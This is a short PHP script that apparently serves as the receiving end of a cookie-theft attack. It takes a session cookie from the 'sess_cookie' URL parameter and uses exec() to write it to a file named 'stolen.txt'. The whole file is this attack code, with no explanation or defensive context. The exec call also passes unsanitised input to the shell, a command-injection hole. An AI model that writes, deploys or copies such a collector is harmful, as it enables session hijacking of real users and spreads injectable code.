<?php
	
	$sess_cookie = $_GET['sess_cookie'];
	
	exec("echo ".$sess_cookie." > stolen.txt");
?>